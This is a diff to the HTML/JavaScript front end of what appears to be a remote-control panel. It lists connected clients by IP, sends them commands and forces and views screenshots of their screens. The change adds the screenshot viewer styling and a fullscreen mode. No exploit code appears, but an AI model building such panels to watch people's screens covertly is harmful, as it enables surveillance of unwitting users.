@@ -190,6 +190,130 @@
             border-top: 1px solid #eee;
         }
         
+        /* Dodaj te style do istniejącego CSS */
+        .screenshot-container {
+            margin-top: 20px;
+            padding: 15px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: none;
+        }
+        
+        .screenshot-wrapper {
+            max-width: 100%;
+            overflow: auto;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            background: #f8f9fa;
+            margin: 10px 0;
+            padding: 10px;
+            text-align: center;
+        }
+        
+        .screenshot-image {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .screenshot-controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        
+        .screenshot-controls button {
+            padding: 8px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9em;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .refresh-btn {
+            background: #2ecc71;
+            color: white;
+        }
+        
+        .force-btn {
+            background: #3498db;
+            color: white;
+        }
+        
+        .fullscreen-btn {
+            background: #9b59b6;
+            color: white;
+        }
+        
+        .screenshot-info {
+            font-size: 0.9em;
+            color: #7f8c8d;
+            margin-top: 5px;
+            padding: 5px;
+            background: #f8f9fa;
+            border-radius: 3px;
+        }
+        
+        .client-item.screenshot-available {
+            border-left: 4px solid #2ecc71;
+            position: relative;
+        }
+        
+        .client-item.screenshot-available::after {
+            content: "📸";
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            font-size: 0.8em;
+        }
+        
+        /* Fullscreen overlay dla screenshotów */
+        .fullscreen-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .fullscreen-img {
+            max-width: 95%;
+            max-height: 90%;
+            object-fit: contain;
+        }
+        
+        .close-fullscreen {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+        
+        .screenshot-stats {
+            color: white;
+            margin-top: 10px;
+            text-align: center;
+        }
+
         @media (max-width: 768px) {
             .main-content {
                 flex-direction: column;
@@ -202,6 +326,13 @@
     </style>
 </head>
 <body>
+    <!-- Dodaj fullscreen overlay -->
+    <div class="fullscreen-overlay" id="fullscreenOverlay">
+        <button class="close-fullscreen" onclick="closeFullscreen()">✕ Zamknij</button>
+        <img id="fullscreenImage" class="fullscreen-img" src="" alt="Screenshot w pełnym ekranie">
+        <div class="screenshot-stats" id="fullscreenStats"></div>
+    </div>
+    
     <div class="container">
         <header>
             <h1>Do robienia szpontów</h1>
@@ -214,7 +345,6 @@
                 <div class="client-selector">
                     <p>Wybierz klienta do sterowania:</p>
                     <div id="clientList" class="client-list">
-                        <!-- Lista klientów będzie dodana dynamicznie -->
                         <div class="no-clients">Brak aktywnych klientów</div>
                     </div>
                 </div>
@@ -224,19 +354,26 @@
                 <h2>Dostępne Komendy</h2>
                 <p id="selectedClientInfo">Nie wybrano klienta</p>
                 
-                <!-- Dodaj kontener na screenshot -->
-                <div class="screenshot-container" id="screenshotContainer" style="display: none;">
+                <!-- Kontener na screenshot -->
+                <div class="screenshot-container" id="screenshotContainer">
                     <h3>Podgląd ekranu klienta:</h3>
-                    <img id="screenshotImage" class="screenshot-preview" 
-                         src="" alt="Screenshot klienta">
+                    <div class="screenshot-wrapper">
+                        <img id="screenshotImage" class="screenshot-image" 
+                             src="" alt="Screenshot klienta"
+                             onclick="openFullscreen(this.src)">
+                    </div>
                     <p id="screenshotInfo" class="screenshot-info"></p>
-                    <button class="refresh-screenshot" onclick="refreshScreenshot()">
-                        Odśwież screenshot
-                    </button>
-                    <button class="command-btn" onclick="sendCommand('screenshot')" 
-                            style="margin-left: 10px;">
-                        Wymuś nowy screenshot
-                    </button>
+                    <div class="screenshot-controls">
+                        <button class="refresh-btn" onclick="refreshScreenshot()">
+                            ↻ Odśwież
+                        </button>
+                        <button class="force-btn" onclick="sendCommand('screenshot')">
+                            📸 Wymuś nowy
+                        </button>
+                        <button class="fullscreen-btn" onclick="openFullscreen(document.getElementById('screenshotImage').src)">
+                            ⛶ Pełny ekran
+                        </button>
+                    </div>
                 </div>
                 
                 <div class="command-buttons">
@@ -264,10 +401,11 @@
     <script>
         let selectedClient = null;
         let screenshotRefreshInterval = null;
+        let currentScreenshotData = null;
         
-        // Aktualizuj listę klientów z informacją o screenshotach
+        // Aktualizuj listę klientów
         function updateClients() {
-            fetch('/api/get_clients_with_screenshots')
+            fetch('/api/clients')
                 .then(response => response.json())
                 .then(clients => {
                     const clientList = document.getElementById('clientList');
@@ -281,21 +419,16 @@
                     clients.forEach(client => {
                         const statusClass = client.status === 'active' ? 'status-active' : 'status-inactive';
                         const isSelected = selectedClient && selectedClient.id === client.id ? 'selected-client' : '';
-                        const hasScreenshot = client.has_screenshot ? 'screenshot-available' : '';
                         
-                        let lastScreenshot = '';
-                        if (client.last_screenshot_time) {
-                            const minutesAgo = Math.floor((Date.now()/1000 - client.last_screenshot_time) / 60);
-                            lastScreenshot = `<br><small>Screenshot: ${minutesAgo} min temu</small>`;
-                        }
+                        // Sprawdź czy klient ma screenshot (poprzez dodatkowe zapytanie)
+                        const hasScreenshotClass = client.has_screenshot ? 'screenshot-available' : '';
                         
                         html += `
-                            <div class="client-item ${isSelected} ${hasScreenshot}" onclick="selectClient('${client.id}')">
+                            <div class="client-item ${isSelected} ${hasScreenshotClass}" onclick="selectClient('${client.id}')">
                                 <div class="client-info">
                                     <div class="client-name">${client.name || 'Unknown'}</div>
                                     <div class="client-id">ID: ${client.id.substring(0, 8)}...</div>
                                     <div>IP: ${client.ip}</div>
-                                    ${lastScreenshot}
                                 </div>
                                 <div class="client-status ${statusClass}">
                                     ${client.status}
@@ -314,8 +447,8 @@
             selectedClient = { id: clientId };
             updateClients();
             
-            // Znajdź klienta na liście
-            fetch('/api/get_clients_with_screenshots')
+            // Pobierz dane klienta
+            fetch('/api/clients')
                 .then(response => response.json())
                 .then(clients => {
                     const client = clients.find(c => c.id === clientId);
@@ -350,10 +483,30 @@
             const screenshotImage = document.getElementById('screenshotImage');
             const screenshotInfo = document.getElementById('screenshotInfo');
             
-            screenshotImage.src = screenshotUrl;
+            // Dodaj listener do załadowania obrazka
+            screenshotImage.onload = function() {
+                const img = this;
+                screenshotInfo.innerHTML = `
+                    Rozmiar: ${img.naturalWidth} × ${img.naturalHeight}px<br>
+                    Ostatnia aktualizacja: ${new Date().toLocaleTimeString()}
+                `;
+                
+                // Zapisz dane screenshotu
+                currentScreenshotData = {
+                    src: img.src,
+                    width: img.naturalWidth,
+                    height: img.naturalHeight,
+                    timestamp: new Date().toLocaleTimeString()
+                };
+            };
             
-            // Aktualizuj informację o czasie
-            screenshotInfo.textContent = `Ostatni screenshot: ${new Date().toLocaleTimeString()}`;
+            screenshotImage.onerror = function() {
+                screenshotInfo.textContent = "Brak dostępnego screenshotu";
+                screenshotImage.src = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZjVmNWY1Ii8+PHRleHQgeD0iNTAwIiB5PSIyMDAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzk5OSI+QnJhayBzY3JlZW5zaG90dTwvdGV4dD48L3N2Zz4=";
+            };
+            
+            // Ustaw źródło obrazka
+            screenshotImage.src = screenshotUrl;
         }
         
         // Odśwież screenshot
@@ -361,6 +514,38 @@
             if (selectedClient) {
                 loadScreenshot(selectedClient.id);
             }
+        }
+        
+        // Otwórz screenshot w pełnym ekranie
+        function openFullscreen(src) {
+            if (!src || src.includes('svg+xml')) return;
+            
+            const overlay = document.getElementById('fullscreenOverlay');
+            const fullscreenImg = document.getElementById('fullscreenImage');
+            const stats = document.getElementById('fullscreenStats');
+            
+            fullscreenImg.src = src;
+            
+            if (currentScreenshotData) {
+                stats.innerHTML = `
+                    Rozmiar: ${currentScreenshotData.width} × ${currentScreenshotData.height}px |
+                    Ostatnia aktualizacja: ${currentScreenshotData.timestamp}
+                `;
+            }
+            
+            overlay.style.display = 'flex';
+            
+            // Dodaj obsługę ESC
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    closeFullscreen();
+                }
+            });
+        }
+        
+        // Zamknij pełny ekran
+        function closeFullscreen() {
+            document.getElementById('fullscreenOverlay').style.display = 'none';
         }
         
         // Wyślij komendę
